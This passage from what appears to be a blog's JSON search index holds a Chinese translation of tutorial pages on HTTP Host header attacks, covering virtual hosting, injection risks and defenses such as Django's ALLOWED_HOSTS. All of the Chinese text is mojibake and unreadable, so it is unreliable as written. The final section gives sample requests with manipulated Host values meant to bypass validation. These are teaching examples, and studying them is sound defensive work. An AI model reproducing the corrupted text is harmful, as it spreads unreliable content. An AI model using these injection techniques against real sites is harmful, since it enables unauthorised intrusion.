clobbering","uri":"/translation/web-security/dom-based/dom-clobbering/"},{"categories":["web security"],"content":"web å®‰å…¨ä¹‹ HTTP Host header attacks","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/http-host-header-attacks/","tags":[],"title":"web å®‰å…¨ä¹‹ HTTP Host header attacks","uri":"/translation/web-security/http-host-header-attacks/http-host-header-attacks/"},{"categories":["web security"],"content":"HTTP Host header attacks åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†è®¨è®ºé”™è¯¯çš„é…ç½®å’Œæœ‰ç¼ºé™·çš„ä¸šåŠ¡é€»è¾‘å¦‚ä½•é€šè¿‡ HTTP Host å¤´ä½¿ç½‘ç«™é­å—å„ç§æ”»å‡»ã€‚æˆ‘ä»¬å°†æ¦‚è¿°è¯†åˆ«æ˜“å— HTTP Host å¤´æ”»å‡»çš„ç½‘ç«™çš„é«˜çº§æ–¹æ³•ï¼Œå¹¶æ¼”ç¤ºå¦‚ä½•åˆ©ç”¨æ­¤æ–¹æ³•ã€‚æœ€åï¼Œæˆ‘ä»¬å°†æä¾›ä¸€äº›æœ‰å…³å¦‚ä½•ä¿æŠ¤è‡ªå·±ç½‘ç«™çš„ä¸€èˆ¬å»ºè®®ã€‚ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/http-host-header-attacks/:0:0","tags":[],"title":"web å®‰å…¨ä¹‹ HTTP Host header attacks","uri":"/translation/web-security/http-host-header-attacks/http-host-header-attacks/"},{"categories":["web security"],"content":"ä»€ä¹ˆæ˜¯ HTTP Host å¤´ ä» HTTP/1.1 å¼€å§‹ï¼ŒHTTP Host å¤´æ˜¯ä¸€ä¸ªå¿…éœ€çš„è¯·æ±‚å¤´ï¼Œå…¶æŒ‡å®šäº†å®¢æˆ·ç«¯æƒ³è¦è®¿é—®çš„åŸŸåã€‚ä¾‹å¦‚ï¼Œå½“ç”¨æˆ·è®¿é—® https://portswigger.net/web-security æ—¶ï¼Œæµè§ˆå™¨å°†ä¼šå‘å‡ºä¸€ä¸ªåŒ…å« Host å¤´çš„è¯·æ±‚ï¼š GET /web-security HTTP/1.1 Host: portswigger.net åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¾‹å¦‚å½“è¯·æ±‚è¢«ä¸­ä»‹ç³»ç»Ÿè½¬å‘æ—¶ï¼ŒHost å€¼å¯èƒ½åœ¨åˆ°è¾¾é¢„æœŸçš„åç«¯ç»„ä»¶ä¹‹å‰è¢«æ›´æ”¹ã€‚æˆ‘ä»¬å°†åœ¨ä¸‹é¢æ›´è¯¦ç»†åœ°è®¨è®ºè¿™ç§åœºæ™¯ã€‚ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/http-host-header-attacks/:1:0","tags":[],"title":"web å®‰å…¨ä¹‹ HTTP Host header attacks","uri":"/translation/web-security/http-host-header-attacks/http-host-header-attacks/"},{"categories":["web security"],"content":"HTTP Host å¤´çš„ä½œç”¨æ˜¯ä»€ä¹ˆ HTTP Host å¤´çš„ä½œç”¨å°±æ˜¯æ ‡è¯†å®¢æˆ·ç«¯æƒ³è¦ä¸å“ªä¸ªåç«¯ç»„ä»¶é€šä¿¡ã€‚å¦‚æœè¯·æ±‚æ²¡æœ‰ Host å¤´æˆ–è€… Host æ ¼å¼ä¸æ­£ç¡®ï¼Œåˆ™æŠŠè¯·æ±‚è·¯ç”±åˆ°é¢„æœŸçš„åº”ç”¨ç¨‹åºæ—¶ä¼šå‡ºç°é—®é¢˜ã€‚ å†å²ä¸Šå› ä¸ºæ¯ä¸ª IP åœ°å€åªä¼šæ‰˜ç®¡å•ä¸ªåŸŸåçš„å†…å®¹ï¼Œæ‰€ä»¥å¹¶ä¸å­˜åœ¨æ¨¡ç³Šæ€§ã€‚ä½†æ˜¯å¦‚ä»Šï¼Œç”±äºåŸºäºäº‘çš„è§£å†³æ–¹æ¡ˆå’Œç›¸å…³æ¶æ„çš„ä¸æ–­å¢é•¿ï¼Œä½¿å¾—å¤šä¸ªç½‘ç«™å’Œåº”ç”¨ç¨‹åºåœ¨åŒä¸€ä¸ª IP åœ°å€è®¿é—®å˜å¾—å¾ˆå¸¸è§ï¼Œè¿™ç§æ–¹å¼ä¹Ÿè¶Šæ¥è¶Šå—æ¬¢è¿ï¼Œéƒ¨åˆ†åŸå› æ˜¯ IPv4 åœ°å€è€—å°½ã€‚ å½“å¤šä¸ªåº”ç”¨ç¨‹åºé€šè¿‡åŒä¸€ä¸ª IP åœ°å€è®¿é—®æ—¶ï¼Œé€šå¸¸æ˜¯ä»¥ä¸‹æƒ…å†µä¹‹ä¸€ã€‚ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/http-host-header-attacks/:2:0","tags":[],"title":"web å®‰å…¨ä¹‹ HTTP Host header attacks","uri":"/translation/web-security/http-host-header-attacks/http-host-header-attacks/"},{"categories":["web security"],"content":"è™šæ‹Ÿä¸»æœº ä¸€ç§å¯èƒ½çš„æƒ…å†µæ˜¯ï¼Œä¸€å° web æœåŠ¡å™¨éƒ¨ç½²å¤šä¸ªç½‘ç«™æˆ–åº”ç”¨ç¨‹åºï¼Œè¿™å¯èƒ½æ˜¯åŒä¸€ä¸ªæ‰€æœ‰è€…æ‹¥æœ‰å¤šä¸ªç½‘ç«™ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯ä¸åŒç½‘ç«™çš„æ‰€æœ‰è€…éƒ¨ç½²åœ¨åŒä¸€ä¸ªå…±äº«å¹³å°ä¸Šã€‚è¿™åœ¨ä»¥å‰ä¸å¤ªå¸¸è§ï¼Œä½†åœ¨ä¸€äº›åŸºäºäº‘çš„ SaaS è§£å†³æ–¹æ¡ˆä¸­ä»ç„¶ä¼šå‡ºç°ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°½ç®¡æ¯ä¸ªä¸åŒçš„ç½‘ç«™éƒ½æœ‰ä¸åŒçš„åŸŸåï¼Œä½†æ˜¯ä»–ä»¬éƒ½ä¸æœåŠ¡å™¨å…±äº«åŒä¸€ä¸ª IP åœ°å€ã€‚è¿™ç§å•å°æœåŠ¡å™¨æ‰˜ç®¡å¤šä¸ªç½‘ç«™çš„æ–¹å¼ç§°ä¸ºâ€œè™šæ‹Ÿä¸»æœºâ€ã€‚ å¯¹äºè®¿é—®ç½‘ç«™çš„æ™®é€šç”¨æˆ·æ¥è¯´ï¼Œé€šå¸¸æ— æ³•åŒºåˆ†ç½‘ç«™ä½¿ç”¨çš„æ˜¯è™šæ‹Ÿä¸»æœºè¿˜æ˜¯è‡ªå·±çš„ä¸“ç”¨æœåŠ¡å™¨ã€‚ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/http-host-header-attacks/:2:1","tags":[],"title":"web å®‰å…¨ä¹‹ HTTP Host header attacks","uri":"/translation/web-security/http-host-header-attacks/http-host-header-attacks/"},{"categories":["web security"],"content":"é€šè¿‡ä¸­ä»‹è·¯ç”±æµé‡ å¦ä¸€ç§å¸¸è§çš„æƒ…å†µæ˜¯ï¼Œç½‘ç«™æ‰˜ç®¡åœ¨ä¸åŒçš„åç«¯æœåŠ¡å™¨ä¸Šï¼Œä½†æ˜¯å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„æ‰€æœ‰æµé‡éƒ½ä¼šé€šè¿‡ä¸­é—´ç³»ç»Ÿè·¯ç”±ã€‚ä¸­é—´ç³»ç»Ÿå¯èƒ½æ˜¯ä¸€ä¸ªç®€å•çš„è´Ÿè½½å‡è¡¡å™¨æˆ–æŸç§åå‘ä»£ç†æœåŠ¡å™¨ã€‚å½“å®¢æˆ·ç«¯é€šè¿‡ CDN è®¿é—®ç½‘ç«™æ—¶ï¼Œè¿™ç§æƒ…å†µå°¤å…¶æ™®éã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå³ä½¿ä¸åŒçš„ç½‘ç«™æ‰˜ç®¡åœ¨ä¸åŒçš„åç«¯æœåŠ¡å™¨ä¸Šï¼Œä½†æ˜¯ä»–ä»¬çš„æ‰€æœ‰åŸŸåéƒ½éœ€è¦è§£æä¸ºä¸­é—´ç³»ç»Ÿè¿™ä¸ª IP åœ°å€ã€‚è¿™ä¹Ÿå¸¦æ¥äº†ä¸€äº›ä¸è™šæ‹Ÿä¸»æœºç›¸åŒçš„æŒ‘æˆ˜ï¼Œå³åå‘ä»£ç†æˆ–è´Ÿè½½å‡è¡¡æœåŠ¡å™¨éœ€è¦çŸ¥é“æ€ä¹ˆæŠŠæ¯ä¸ªè¯·æ±‚è·¯ç”±åˆ°å“ªä¸ªåˆé€‚çš„åç«¯ã€‚ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/http-host-header-attacks/:2:2","tags":[],"title":"web å®‰å…¨ä¹‹ HTTP Host header attacks","uri":"/translation/web-security/http-host-header-attacks/http-host-header-attacks/"},{"categories":["web security"],"content":"HTTP Host å¤´å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜ è§£å†³ä¸Šè¿°çš„æƒ…å†µï¼Œéƒ½éœ€è¦ä¾èµ–äº Host å¤´æ¥æŒ‡å®šè¯·æ±‚é¢„æœŸçš„æ¥æ”¶æ–¹ã€‚ä¸€ä¸ªå¸¸è§çš„æ¯”å–»æ˜¯ç»™ä½åœ¨å…¬å¯“æ¥¼é‡Œçš„æŸä¸ªäººå†™ä¿¡çš„è¿‡ç¨‹ã€‚æ•´æ ‹æ¥¼éƒ½æ˜¯åŒä¸€ä¸ªè¡—é“åœ°å€ï¼Œä½†æ˜¯è¿™ä¸ªè¡—é“åœ°å€åé¢æœ‰è®¸å¤šä¸ªä¸åŒçš„å…¬å¯“æˆ¿é—´ï¼Œæ¯ä¸ªå…¬å¯“æˆ¿é—´éƒ½éœ€è¦ä»¥æŸç§æ–¹å¼æ¥å—æ­£ç¡®çš„é‚®ä»¶ã€‚è§£å†³è¿™ä¸ªé—®é¢˜çš„ä¸€ä¸ªæ–¹æ³•å°±æ˜¯ç®€å•åœ°åœ¨åœ°å€ä¸­æ·»åŠ å…¬å¯“æˆ¿é—´å·ç æˆ–æ”¶ä»¶äººçš„å§“åã€‚å¯¹äº HTTP æ¶ˆæ¯è€Œè¨€ï¼ŒHost å¤´çš„ä½œç”¨ä¸ä¹‹ç±»ä¼¼ã€‚ å½“æµè§ˆå™¨å‘é€è¯·æ±‚æ—¶ï¼Œç›®æ ‡ URL å°†è§£æä¸ºç‰¹å®šæœåŠ¡å™¨çš„ IP åœ°å€ï¼Œå½“æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚æ—¶ï¼Œå®ƒä½¿ç”¨ Host å¤´æ¥ç¡®å®šé¢„æœŸçš„åç«¯å¹¶ç›¸åº”åœ°è½¬å‘è¯¥è¯·æ±‚ã€‚ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/http-host-header-attacks/:2:3","tags":[],"title":"web å®‰å…¨ä¹‹ HTTP Host header attacks","uri":"/translation/web-security/http-host-header-attacks/http-host-header-attacks/"},{"categories":["web security"],"content":"ä»€ä¹ˆæ˜¯ HTTP Host å¤´æ”»å‡» HTTP Host å¤´æ”»å‡»ä¼šåˆ©ç”¨ä»¥ä¸å®‰å…¨çš„æ–¹å¼å¤„ç† Host å¤´çš„æ¼æ´ç½‘ç«™ã€‚å¦‚æœæœåŠ¡å™¨éšå¼ä¿¡ä»» Host æ ‡å¤´ï¼Œä¸”æœªèƒ½æ­£ç¡®éªŒè¯æˆ–è½¬ä¹‰å®ƒï¼Œåˆ™æ”»å‡»è€…å¯èƒ½ä¼šä½¿ç”¨æ­¤è¾“å…¥æ¥æ³¨å…¥æœ‰å®³çš„æœ‰æ•ˆè´Ÿè½½ï¼Œä»¥æ“çºµæœåŠ¡å™¨ç«¯çš„è¡Œä¸ºã€‚å°†æœ‰å®³è´Ÿè½½ç›´æ¥æ³¨å…¥åˆ° Host å¤´çš„æ”»å‡»é€šå¸¸ç§°ä¸º â€œHost header injectionâ€ï¼ˆä¸»æœºå¤´æ³¨å…¥æ”»å‡»ï¼‰ã€‚ ç°æˆçš„ web åº”ç”¨é€šå¸¸ä¸çŸ¥é“å®ƒä»¬éƒ¨ç½²åœ¨å“ªä¸ªåŸŸä¸Šï¼Œé™¤éåœ¨å®‰è£…è¿‡ç¨‹ä¸­æ‰‹åŠ¨é…ç½®æŒ‡å®šäº†å®ƒã€‚æ­¤æ—¶å½“ä»–ä»¬éœ€è¦çŸ¥é“å½“å‰åŸŸæ—¶ï¼Œä¾‹å¦‚è¦ç”Ÿæˆç”µå­é‚®ä»¶ä¸­åŒ…å«çš„ URL ï¼Œä»–ä»¬å¯èƒ½ä¼šä» Host å¤´æ£€ç´¢åŸŸåï¼š \u003ca href=\"https://_SERVER['HOST']/support\"\u003eContact support\u003c/a\u003e æ ‡å¤´çš„å€¼ä¹Ÿå¯ä»¥ç”¨äºåŸºç¡€è®¾æ–½å†…ä¸åŒç³»ç»Ÿä¹‹é—´çš„å„ç§äº¤äº’ã€‚ ç”±äº Host å¤´å®é™…ä¸Šç”¨æˆ·å¯ä»¥æ§åˆ¶çš„ï¼Œå› æ­¤å¯èƒ½ä¼šå¯¼è‡´å¾ˆå¤šé—®é¢˜ã€‚å¦‚æœè¾“å…¥æ²¡æœ‰æ­£ç¡®çš„è½¬ä¹‰æˆ–éªŒè¯ï¼Œåˆ™ Host å¤´å¯èƒ½ä¼šæˆä¸ºåˆ©ç”¨å…¶ä»–æ¼æ´çš„æ½œåœ¨è½½ä½“ï¼Œæœ€å€¼å¾—æ³¨æ„çš„æ˜¯ï¼š Web ç¼“å­˜ä¸­æ¯’ ç‰¹å®šåŠŸèƒ½ä¸­çš„ä¸šåŠ¡é€»è¾‘ç¼ºé™· åŸºäºè·¯ç”±çš„ SSRF å…¸å‹çš„æœåŠ¡å™¨æ¼æ´ï¼Œå¦‚ SQL æ³¨å…¥ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/http-host-header-attacks/:3:0","tags":[],"title":"web å®‰å…¨ä¹‹ HTTP Host header attacks","uri":"/translation/web-security/http-host-header-attacks/http-host-header-attacks/"},{"categories":["web security"],"content":"HTTP Host æ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„ HTTP Host æ¼æ´çš„äº§ç”Ÿé€šå¸¸æ˜¯åŸºäºå­˜åœ¨ç¼ºé™·çš„å‡è®¾ï¼Œå³è¯¯è®¤ä¸º Host å¤´æ˜¯ç”¨æˆ·ä¸å¯æ§åˆ¶çš„ã€‚è¿™å¯¼è‡´ Host å¤´è¢«éšå¼ä¿¡ä»»äº†ï¼Œå…¶å€¼æœªè¿›è¡Œæ­£ç¡®çš„éªŒè¯æˆ–è½¬ä¹‰ï¼Œè€Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨å·¥å…·è½»æ¾åœ°ä¿®æ”¹ Host ã€‚ å³ä½¿ Host å¤´æœ¬èº«å¾—åˆ°äº†å®‰å…¨çš„å¤„ç†ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ³¨å…¥å…¶ä»–æ ‡å¤´æ¥è¦†ç›– Host ï¼Œè¿™å–å†³äºå¤„ç†ä¼ å…¥è¯·æ±‚çš„æœåŠ¡å™¨çš„é…ç½®ã€‚æœ‰æ—¶ç½‘ç«™æ‰€æœ‰è€…ä¸çŸ¥é“é»˜è®¤æƒ…å†µä¸‹è¿™äº›å¯ä»¥è¦†ç›– Host çš„æ ‡å¤´æ˜¯å—æ”¯æŒçš„ï¼Œå› æ­¤ï¼Œå¯èƒ½ä¸ä¼šè¿›è¡Œä¸¥æ ¼çš„å®¡æŸ¥ã€‚ å®é™…ä¸Šï¼Œè®¸å¤šæ¼æ´å¹¶ä¸æ˜¯ç”±äºç¼–ç ä¸å®‰å…¨ï¼Œè€Œæ˜¯ç”±äºç›¸å…³åŸºç¡€æ¶æ„ä¸­çš„ä¸€ä¸ªæˆ–å¤šä¸ªç»„ä»¶çš„é…ç½®ä¸å®‰å…¨ã€‚ä¹‹æ‰€ä»¥ä¼šå‡ºç°è¿™äº›é…ç½®é—®é¢˜ï¼Œæ˜¯å› ä¸ºç½‘ç«™å°†ç¬¬ä¸‰æ–¹æŠ€æœ¯é›†æˆåˆ°å…¶ä½“ç³»æ¶æ„ä¸­ï¼Œè€Œæœªå®Œå…¨äº†è§£é…ç½®é€‰é¡¹åŠå…¶å®‰å…¨å«ä¹‰ã€‚ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/http-host-header-attacks/:4:0","tags":[],"title":"web å®‰å…¨ä¹‹ HTTP Host header attacks","uri":"/translation/web-security/http-host-header-attacks/http-host-header-attacks/"},{"categories":["web security"],"content":"åˆ©ç”¨ HTTP Host å¤´æ¼æ´ è¯¦ç»†å†…å®¹è¯·æŸ¥é˜…æœ¬ç« ä¸‹æ–‡ã€‚ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/http-host-header-attacks/:5:0","tags":[],"title":"web å®‰å…¨ä¹‹ HTTP Host header attacks","uri":"/translation/web-security/http-host-header-attacks/http-host-header-attacks/"},{"categories":["web security"],"content":"å¦‚ä½•é˜²å¾¡ HTTP Host å¤´æ”»å‡» é˜²å¾¡ HTTP Host å¤´æ”»å‡»æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯é¿å…åœ¨æœåŠ¡ç«¯ä»£ç ä¸­ä½¿ç”¨ Host å¤´ã€‚ä»”ç»†æ£€æŸ¥ä¸‹æ¯ä¸ª URL åœ°å€æ˜¯å¦çœŸçš„ç»å¯¹éœ€è¦ï¼Œä½ ç»å¸¸ä¼šå‘ç°ä½ å¯ä»¥ç”¨ä¸€ä¸ªç›¸å¯¹çš„ URL åœ°å€æ›¿ä»£ã€‚è¿™ä¸ªç®€å•çš„æ”¹å˜å¯ä»¥å¸®åŠ©ä½ é˜²å¾¡ web ç¼“å­˜ä¸­æ¯’ã€‚ å…¶ä»–é˜²å¾¡æªæ–½æœ‰ï¼š ä¿æŠ¤ç»å¯¹çš„ URL åœ°å€ å¦‚æœä½ å¿…é¡»ä½¿ç”¨ç»å¯¹çš„ URL åœ°å€ï¼Œåˆ™åº”è¯¥åœ¨é…ç½®æ–‡ä»¶ä¸­æ‰‹åŠ¨æŒ‡å®šå½“å‰åŸŸåå¹¶å¼•ç”¨æ­¤å€¼ï¼Œè€Œä¸æ˜¯ Host å¤´çš„å€¼ã€‚è¿™ç§æ–¹æ³•å°†æ¶ˆé™¤å¯†ç é‡ç½®ä¸­æ¯’çš„å¨èƒã€‚ éªŒè¯ Host å¤´ å¦‚æœå¿…é¡»ä½¿ç”¨ Host å¤´ï¼Œè¯·ç¡®ä¿æ­£ç¡®éªŒè¯å®ƒã€‚è¿™åŒ…æ‹¬å¯¹ç…§å…è®¸åŸŸçš„ç™½åå•è¿›è¡Œæ£€æŸ¥ï¼Œæ‹’ç»æˆ–é‡å®šå‘æ— æ³•è¯†åˆ«çš„ Host çš„ä»»ä½•è¯·æ±‚ã€‚ä½ åº”è¯¥æŸ¥é˜…æ‰€ä½¿ç”¨çš„æ¡†æ¶çš„ç›¸å…³æ–‡æ¡£ã€‚ä¾‹å¦‚ Django æ¡†æ¶åœ¨é…ç½®æ–‡ä»¶ä¸­æä¾›äº† ALLOWED_HOSTS é€‰é¡¹ï¼Œè¿™å°†å‡å°‘ä½ é­å—ä¸»æœºæ ‡å¤´æ³¨å…¥æ”»å‡»çš„é£é™©ã€‚ ä¸æ”¯æŒèƒ½å¤Ÿé‡å†™ Host çš„å¤´ æ£€æŸ¥ä½ æ˜¯å¦ä¸æ”¯æŒå¯èƒ½ç”¨äºæ„é€ æ”»å‡»çš„å…¶ä»–æ ‡å¤´ï¼Œå°¤å…¶æ˜¯ X-Forwarded-Host ï¼Œç‰¢è®°é»˜è®¤æƒ…å†µä¸‹è¿™äº›å¤´å¯èƒ½æ˜¯è¢«å…è®¸çš„ã€‚ ä½¿ç”¨å†…éƒ¨è™šæ‹Ÿä¸»æœºæ—¶è¦å°å¿ƒ ä½¿ç”¨è™šæ‹Ÿä¸»æœºæ—¶ï¼Œåº”é¿å…å°†å†…éƒ¨ç½‘ç«™å’Œåº”ç”¨ç¨‹åºæ‰˜ç®¡åˆ°é¢å‘å…¬å¼€å†…å®¹çš„æœåŠ¡å™¨ä¸Šã€‚å¦åˆ™ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡ Host å¤´æ¥è®¿é—®å†…éƒ¨åŸŸã€‚ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/http-host-header-attacks/:6:0","tags":[],"title":"web å®‰å…¨ä¹‹ HTTP Host header attacks","uri":"/translation/web-security/http-host-header-attacks/http-host-header-attacks/"},{"categories":["web security"],"content":"Exploiting HTTP Host header vulnerabilities","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/","tags":[],"title":"Exploiting HTTP Host header vulnerabilities","uri":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/"},{"categories":["web security"],"content":"å¦‚ä½•è¯†åˆ«å’Œåˆ©ç”¨ HTTP Host å¤´æ¼æ´ åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†æ›´ä»”ç»†åœ°äº†è§£å¦‚ä½•è¯†åˆ«ç½‘ç«™æ˜¯å¦å­˜åœ¨ HTTP Host å¤´æ¼æ´ã€‚ç„¶åï¼Œæˆ‘ä»¬å°†æä¾›ä¸€äº›ç¤ºä¾‹ï¼Œè¯´æ˜å¦‚ä½•åˆ©ç”¨æ­¤æ¼æ´ã€‚ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/:0:0","tags":[],"title":"Exploiting HTTP Host header vulnerabilities","uri":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/"},{"categories":["web security"],"content":"å¦‚ä½•ä½¿ç”¨ HTTP Host å¤´æµ‹è¯•æ¼æ´ è¦æµ‹è¯•ç½‘ç«™æ˜¯å¦æ˜“å— HTTP Host æ”»å‡»ï¼Œä½ éœ€è¦ä¸€ä¸ªæ‹¦æˆªä»£ç†ï¼ˆå¦‚ Burp proxy ï¼‰å’Œæ‰‹åŠ¨æµ‹è¯•å·¥å…·ï¼ˆå¦‚ Burp Repeater å’Œ Burp intruiter ï¼‰ã€‚ ç®€è€Œè¨€ä¹‹ï¼Œä½ éœ€è¦èƒ½å¤Ÿä¿®æ”¹ Host æ ‡å¤´ï¼Œå¹¶ä¸”ä½ çš„è¯·æ±‚èƒ½å¤Ÿåˆ°è¾¾ç›®æ ‡åº”ç”¨ç¨‹åºã€‚å¦‚æœæ˜¯è¿™æ ·ï¼Œåˆ™å¯ä»¥ä½¿ç”¨æ­¤æ ‡å¤´æ¥æ¢æµ‹åº”ç”¨ç¨‹åºï¼Œå¹¶è§‚å¯Ÿå…¶å¯¹å“åº”çš„å½±å“ã€‚ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/:1:0","tags":[],"title":"Exploiting HTTP Host header vulnerabilities","uri":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/"},{"categories":["web security"],"content":"æä¾›ä¸€ä¸ªä»»æ„çš„ Host å¤´ åœ¨æ¢æµ‹ Host å¤´æ³¨å…¥æ¼æ´æ—¶ï¼Œç¬¬ä¸€æ­¥æµ‹è¯•æ˜¯ç»™ Host å¤´è®¾ç½®ä»»æ„çš„ã€æ— æ³•è¯†åˆ«çš„åŸŸåï¼Œç„¶åçœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆã€‚ ä¸€äº›æ‹¦æˆªä»£ç†ç›´æ¥ä» Host å¤´è¿æ¥ç›®æ ‡ IP åœ°å€ï¼Œè¿™ä½¿å¾—è¿™ç§æµ‹è¯•å‡ ä¹ä¸å¯èƒ½ï¼›å¯¹æŠ¥å¤´æ‰€åšçš„ä»»ä½•æ›´æ”¹éƒ½ä¼šå¯¼è‡´è¯·æ±‚å‘é€åˆ°å®Œå…¨ä¸åŒçš„ IP åœ°å€ã€‚ç„¶è€Œï¼ŒBurp Suite ç²¾ç¡®åœ°ä¿æŒäº†ä¸»æœºå¤´å’Œç›®æ ‡ IP åœ°å€ä¹‹é—´çš„åˆ†ç¦»ï¼Œè¿™ç§åˆ†ç¦»å…è®¸ä½ æä¾›æ‰€éœ€çš„ä»»æ„æˆ–æ ¼å¼é”™è¯¯çš„ä¸»æœºå¤´ï¼ŒåŒæ—¶ä»ç„¶ç¡®ä¿å°†è¯·æ±‚å‘é€åˆ°é¢„æœŸç›®æ ‡ã€‚ æœ‰æ—¶ï¼Œå³ä½¿ä½ æä¾›äº†ä¸€ä¸ªæ„å¤–çš„ Host å¤´ï¼Œä½ ä»ç„¶å¯ä»¥è®¿é—®ç›®æ ‡ç½‘ç«™ã€‚è¿™å¯èƒ½æœ‰å¾ˆå¤šåŸå› ã€‚ä¾‹å¦‚ï¼ŒæœåŠ¡å™¨æœ‰æ—¶è®¾ç½®äº†é»˜è®¤æˆ–å›é€€é€‰é¡¹ï¼Œä»¥å¤„ç†æ— æ³•è¯†åˆ«çš„åŸŸåè¯·æ±‚ã€‚å¦‚æœä½ çš„ç›®æ ‡ç½‘ç«™ç¢°å·§æ˜¯é»˜è®¤çš„ï¼Œé‚£ä½ å°±èµ°è¿äº†ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥å¼€å§‹ç ”ç©¶åº”ç”¨ç¨‹åºå¯¹ Host å¤´åšäº†ä»€ä¹ˆï¼Œä»¥åŠè¿™ç§è¡Œä¸ºæ˜¯å¦å¯åˆ©ç”¨ã€‚ å¦ä¸€æ–¹é¢ï¼Œç”±äº Host å¤´æ˜¯ç½‘ç«™å·¥ä½œçš„åŸºæœ¬éƒ¨åˆ†ï¼Œç¯¡æ”¹å®ƒé€šå¸¸æ„å‘³ç€ä½ å°†æ— æ³•è®¿é—®ç›®æ ‡åº”ç”¨ç¨‹åºã€‚æ¥æ”¶åˆ°ä½ çš„è¯·æ±‚çš„åå‘ä»£ç†æˆ–è´Ÿè½½å¹³è¡¡å™¨å¯èƒ½æ ¹æœ¬ä¸çŸ¥é“å°†å…¶è½¬å‘åˆ°ä½•å¤„ï¼Œä»è€Œå“åº” â€œInvalid Host headerâ€ è¿™ç§é”™è¯¯ã€‚å¦‚æœä½ çš„ç›®æ ‡å¾ˆå¯èƒ½æ˜¯é€šè¿‡ CDN è®¿é—®çš„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ åº”è¯¥ç»§ç»­å°è¯•ä¸‹é¢æ¦‚è¿°çš„ä¸€äº›æŠ€æœ¯ã€‚ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/:1:1","tags":[],"title":"Exploiting HTTP Host header vulnerabilities","uri":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/"},{"categories":["web security"],"content":"æ£€æŸ¥æ˜¯å¦å­˜åœ¨éªŒè¯ç¼ºé™· ä½ å¯èƒ½ä¼šå‘ç°ä½ çš„è¯·æ±‚ç”±äºæŸç§å®‰å…¨æªæ–½è€Œè¢«é˜»æ­¢ï¼Œè€Œä¸æ˜¯æ”¶åˆ°ä¸€ä¸ª â€œInvalid Host headerâ€ å“åº”ã€‚ä¾‹å¦‚ï¼Œä¸€äº›ç½‘ç«™å°†éªŒè¯ Host å¤´æ˜¯å¦ä¸ TLS æ¡æ‰‹çš„ SNI åŒ¹é…ã€‚è¿™å¹¶ä¸æ„å‘³ç€å®ƒä»¬å¯¹ Host å¤´æ”»å‡»å…ç–«ã€‚ ä½ åº”è¯¥è¯•ç€ç†è§£ç½‘ç«™æ˜¯å¦‚ä½•è§£æ Host å¤´çš„ã€‚è¿™æœ‰æ—¶ä¼šæš´éœ²å‡ºä¸€äº›å¯ä»¥ç”¨æ¥ç»•è¿‡éªŒè¯çš„æ¼æ´ã€‚ä¾‹å¦‚ï¼Œä¸€äº›è§£æç®—æ³•å¯èƒ½ä¼šå¿½ç•¥ä¸»æœºå¤´ä¸­çš„ç«¯å£ï¼Œè¿™æ„å‘³ç€åªæœ‰åŸŸåè¢«éªŒè¯ã€‚åªè¦ä½ æä¾›ä¸€ä¸ªéæ•°å­—ç«¯å£ï¼Œä¿æŒåŸŸåä¸å˜ï¼Œå°±å¯ä»¥ç¡®ä¿ä½ çš„è¯·æ±‚åˆ°è¾¾ç›®æ ‡åº”ç”¨ç¨‹åºï¼ŒåŒæ—¶å¯ä»¥é€šè¿‡ç«¯å£æ³¨å…¥æœ‰å®³è´Ÿè½½ã€‚ GET /example HTTP/1.1 Host: vulnerable-website.com:bad-stuff-here æŸäº›ç½‘ç«™çš„éªŒè¯é€»è¾‘å¯èƒ½æ˜¯å…è®¸ä»»æ„å­åŸŸã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥é€šè¿‡æ³¨å†Œä»»æ„å­åŸŸåæ¥å®Œå…¨ç»•è¿‡éªŒè¯ï¼Œè¯¥åŸŸåä»¥ç™½åå•ä¸­åŸŸåçš„ç›¸åŒå­—ç¬¦ä¸²ç»“å°¾ï¼š GET /example HTTP/1.1 Host: notvulnerable-website.com æˆ–è€…ï¼Œä½ å¯ä»¥åˆ©ç”¨å·²ç»æ³„éœ²çš„ä¸å®‰å…¨çš„å­åŸŸï¼š GET /example HTTP/1.1 Host: hacked-subdomain.vulnerable-website.com 